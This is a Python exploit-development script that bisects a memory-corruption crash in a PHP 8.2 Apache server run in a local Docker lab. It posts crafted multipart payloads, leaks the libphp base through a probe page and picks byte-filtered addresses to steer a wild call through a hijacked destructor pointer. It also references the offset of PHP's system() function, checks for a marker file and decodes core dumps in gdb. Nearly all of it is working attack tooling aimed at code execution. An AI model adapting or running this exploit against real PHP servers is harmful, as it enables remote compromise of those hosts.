#!/usr/bin/env python3
"""oom117: TWO-CORNER BISECT vs the ONLY proven crash (98-series).

Background: every values-carried IS_OBJECT run since oom112 fired SILENT
(oom116b: legal B bits, proper fatal, no crash, no core). But the
98-series names-stamp fires crashed 3/3 with rdi=0x7a7a414141414141
(wild call through zend_rc_dtor_func[122] == NULL, verified today in
phpbuild gdb: 0xf2bb70 holds 0). So dispatch REACHES type-driven
dispatch through NAMES windows, never through my VALUES windows.

Corner C (baseline, must reproduce): payload68.build_attack(
    3400, stamp, target_obj=0x414141414141)  -> names = phase-7 '41'
    cells, values 'v', posted via P.post() to /oom_mod.php (exact
    98-series client). EXPECT: conn kill/HTTP5xx + /tmp/core,
    rdi = 0x7a7a414141414141.
Corner B (the reach test): same names recipe + value_tile = B,B
    self-typing cell (legal IS_OBJECT windows everywhere in values).
    B measured per-boot from marker probe (C0 + 3584*13 + legal off).
    - crash w/ rdi ~ B        -> values ARE walked; oom116 bug hunt
    - crash w/ rdi = 0x7a7a41 -> values NOT walked; pivot to names
    - no crash                -> values presence suppresses names crash
One armed crash per boot law -> recreate php_vuln between corners
(recipe from docker inspect; cores decoded BEFORE recreate).

Laws carried: TILE (reps=1537//len), probe parser (R= line only),
B bits (nib8==8, bit8==1, bit9==0), no banned name bytes, md5 gate.
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8081"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
ZIF_SYSTEM = 0x39B8A0
VMARK = b"QMARK7XY" * 3
MARK_CELL = VMARK[:16]
WARM = b"WARMUPX" * 24 + b"W" * 400
K1 = 3400
STRIDE = 3584
PART = 13


def get(url, timeout=60):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(65536).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(65536).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def probe_scan(needle, chunk=262144, maxc=8):
    for attempt in range(6):
        code, out = get("%s/oom_probe.php?h=%s&chunk=%d&maxc=%d"
                        % (HOST, needle.hex(), chunk, maxc))
        if code == 200 and out.strip() and "Fatal" not in out \
                and out.strip() not in ("bad", "ERR open"):
            offs = []
            for line in out.splitlines():
                line = line.strip()
                if not line.startswith("R="):
                    continue
                m = re.search(r"d=((?:0x)?[0-9a-f]+(?: (?:0x)?[0-9a-f]+)*)", line)
                if m:
                    for tok in m.group(1).split():
                        v = int(tok, 16)
                        if v > 0x10000:
                            offs.append(v)
            if offs:
                return offs
        time.sleep(0.7)
    return []


def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None


def sh(cmd, timeout=60):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()


def ground(tag):
    md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    x = sh("ls /tmp/x 2>&1")
    core = sh("ls -la /tmp/core 2>&1 | head -1")
    print("[%s] md5=%s x=%s core=%s" % (tag, md5[:8], x[:30], core[:60]), flush=True)
    return md5 == STOCK_MD5


def post_mod(body, timeout=300):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(400).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(400).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def decode_core(tag):
    """Two-hop core pull + rdi decode in phpbuild (laws: two-hop, gdb only there)."""
    host_copy = "/tmp/core117_%s" % tag
    c1 = subprocess.run(["docker", "cp", "php_vuln:/tmp/core", host_copy], capture_output=True)
    if c1.returncode != 0:
        print("  core pull FAILED: %s" % c1.stderr.decode()[:100], flush=True)
        return None
    subprocess.run(["docker", "cp", host_copy, "phpbuild:/tmp/core.117_%s" % tag], capture_output=True)
    open("/tmp/g117.gdb", "w").write("set pagination off\nset confirm off\nbt 3\ninfo registers rdi rsi rdx rip\nquit\n")
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                        "gdb -q -batch -x /tmp/g117.gdb /tmp/libphp.stock.so /tmp/core.117_%s 2>&1 | tail -20" % tag],
                       capture_output=True, timeout=120)
    out = r.stdout.decode("latin1")
    m = re.search(r"rdi\s+(0x[0-9a-f]+)", out)
    print("  core.%s decoded: rdi=%s" % (tag, m.group(1) if m else "?"), flush=True)
    print(out[-900:], flush=True)
    return m.group(1) if m else None


def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8081:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False


def cell_of(addr):
    return struct.pack("<Q", addr) * 2


print("=== oom117: two-corner bisect (C baseline / B values-reach) ===", flush=True)
assert ground("preflight"), "md5 NOT stock - abort"
print("base=0x%s" % (base_now() and hex(base_now())), flush=True)

# ---------- CORNER C: exact 98-series recipe ----------
print("--- corner C: names stamps, values v (98-series replica) ---", flush=True)
for _ in range(20):
    get(HOST + "/oom_sapi.php", timeout=10)  # keepalive warm (no body posts; keep boot untouched)
cbody = P.build_attack(K1, 6100000, target_obj=0x414141414141)
print("C body %.2f MB -> /oom_mod.php" % (len(cbody) / 1048576.0), flush=True)
ccode, cresp = post_mod(cbody)
print("C: code=%s resp=%r" % (ccode, cresp[:150]), flush=True)
time.sleep(2)
print("C core: %s" % sh("ls -la /tmp/core 2>&1 | head -1"), flush=True)
crdi = decode_core("c") if sh("test -f /tmp/core && echo y") == "y" else None
print("C VERDICT: crash=%s rdi=%s" % (crdi is not None, crdi), flush=True)
if crdi is None:
    print("!!! baseline did NOT crash - env drift, aborting before corner B", flush=True)
    print("=== done (aborted) ===", flush=True)
    raise SystemExit(0)

# ---------- recreate boot (one armed crash per boot) ----------
print("--- recreating php_vuln (fresh boot for B) ---", flush=True)
if not recreate():
    print("!!! recreate failed", flush=True)
    raise SystemExit(1)
assert ground("post-recreate"), "md5 NOT stock after recreate"
for _ in range(20):
    get(HOST + "/oom_sapi.php", timeout=10)
BASE = base_now()
print("base=0x%x" % BASE, flush=True)

# ---------- CORNER B: names stamps + values B,B run ----------
print("--- corner B: names stamps, values B,B (reach test) ---", flush=True)
mbody = P.build_attack(K1, 6200000, target_obj=0x414141414141, value_tile=MARK_CELL)
post_mod(mbody)
offs = probe_scan(VMARK)
assert offs, "marker not found"
C0 = offs[0]
print("C0=0x%x strides=%s" % (C0, [hex(o - C0) for o in offs[1:4]]), flush=True)
VSTART = C0 + STRIDE * PART
B = OFF = None
for off in range(0x100, 1536 - 0xB8 - 16):
    cand = VSTART + off
    if cand & 0xF != 8 or (cand >> 8) & 1 != 1 or (cand >> 9) & 1 != 0:
        continue
    nb = cand.to_bytes(6, "little")
    if any(b in (0x00, 0x0A, 0x0D, 0x22, 0x27, 0x5C, 0x3B, 0x3D) for b in nb):
        continue
    B, OFF = cand, off
    break
assert B, "no legal B"
print("B=0x%x (part %d +0x%x) nib8=%d bit8=%d bit9=%d"
      % (B, PART, OFF, B & 0xF, (B >> 8) & 1, (B >> 9) & 1), flush=True)
bbody = P.build_attack(K1, 6200000, target_obj=0x414141414141, value_tile=cell_of(B))
print("B body %.2f MB -> /oom_mod.php" % (len(bbody) / 1048576.0), flush=True)
bcode, bresp = post_mod(bbody)
print("B: code=%s resp=%r" % (bcode, bresp[:150]), flush=True)
time.sleep(2)
bcore = sh("test -f /tmp/core && echo y") == "y"
brdi = decode_core("b") if bcore else None
xfin = sh("cat /tmp/x 2>&1")
print("B VERDICT: crash=%s rdi=%s x=%s" % (bcore, brdi, xfin[:40]), flush=True)

print("=== SUMMARY ===", flush=True)
print("C: crash=%s rdi=%s (expect 0x7a7a414141414141)" % (crdi is not None, crdi), flush=True)
print("B: crash=%s rdi=%s" % (bcore, brdi), flush=True)
print("=== done ===", flush=True)
